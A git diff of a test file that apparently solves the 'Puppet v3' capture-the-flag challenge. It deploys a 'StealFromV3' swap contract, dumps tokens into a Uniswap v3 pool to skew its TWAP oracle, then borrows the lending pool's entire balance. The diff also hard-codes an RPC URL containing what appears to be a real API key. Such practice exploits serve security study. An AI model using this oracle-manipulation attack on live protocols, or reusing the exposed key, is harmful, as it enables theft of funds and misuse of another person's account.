@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth-mainnet.g.alchemy.com/v2/7HovMoEZOZIVbooQrxZ6hvBS7rsvdznk";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -70,7 +70,7 @@ describe('[Challenge] Puppet v3', function () {
 
         // Deploy DVT token. This is the token to be traded against WETH in the Uniswap v3 pool.
         token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
-        
+
         // Create the Uniswap v3 pool
         uniswapPositionManager = new ethers.Contract("0xC36442b4a4522E871399CD717aBDD847Ab11FE88", positionManagerJson.abi, deployer);
         const FEE = 3000; // 0.3%
@@ -89,7 +89,7 @@ describe('[Challenge] Puppet v3', function () {
         );
         uniswapPool = new ethers.Contract(uniswapPoolAddress, poolJson.abi, deployer);
         await uniswapPool.increaseObservationCardinalityNext(40);
-        
+
         // Deployer adds liquidity at current price to Uniswap V3 exchange
         await weth.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
         await token.approve(uniswapPositionManager.address, ethers.constants.MaxUint256);
@@ -105,7 +105,7 @@ describe('[Challenge] Puppet v3', function () {
             amount0Min: 0,
             amount1Min: 0,
             deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
-        }, { gasLimit: 5000000 });        
+        }, { gasLimit: 5000000 });
 
         // Deploy the lending pool
         lendingPool = await (await ethers.getContractFactory('PuppetV3Pool', deployer)).deploy(
@@ -140,6 +140,27 @@ describe('[Challenge] Puppet v3', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("eth needed to lend 1 dvt", await lendingPool.calculateDepositOfWETHRequired(token.balanceOf(lendingPool.address)));
+        // await weth.connect(player).deposit({ value: 3 });
+        // await weth.connect(player).approve(lendingPool.address, 3);
+        // await lendingPool.connect(player).borrow(1);
+        console.log("uniswapPoolToken", await token.balanceOf(uniswapPool.address), await weth.balanceOf(uniswapPool.address));
+        console.log("player balance", await token.balanceOf(player.address), await weth.balanceOf(player.address));
+
+        steal = await (await ethers.getContractFactory('StealFromV3', player)).deploy("0xE592427A0AEce92De3Edee1F18E0157C05861564");
+        console.log("steal deployed");
+        await token.connect(player).approve(steal.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await steal.connect(player).swapExactInputSingle(PLAYER_INITIAL_TOKEN_BALANCE, token.address);
+        console.log("player balance", await token.balanceOf(player.address), await weth.balanceOf(player.address));
+        console.log("uniswapPoolToken", await token.balanceOf(uniswapPool.address), await weth.balanceOf(uniswapPool.address));
+
+        // await token.transfer(lendingPool.address, LENDING_POOL_INITIAL_TOKEN_BALANCE * 100);
+
+        await time.increase(70);
+        console.log("eth needed to lend 1 dvt", await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));
+        await weth.connect(player).approve(lendingPool.address, weth.balanceOf(player.address));
+        await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+
     });
 
     after(async function () {
